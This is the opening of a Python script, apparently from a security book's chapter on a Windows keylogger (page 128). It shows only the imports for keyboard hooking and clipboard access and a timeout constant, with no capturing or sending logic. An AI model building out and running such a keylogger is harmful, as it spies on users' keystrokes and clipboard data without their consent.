#!/usr/bin/env/python
'''
Keylogging for Fun and Keystrokes (Windows)
Page 128
'''

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

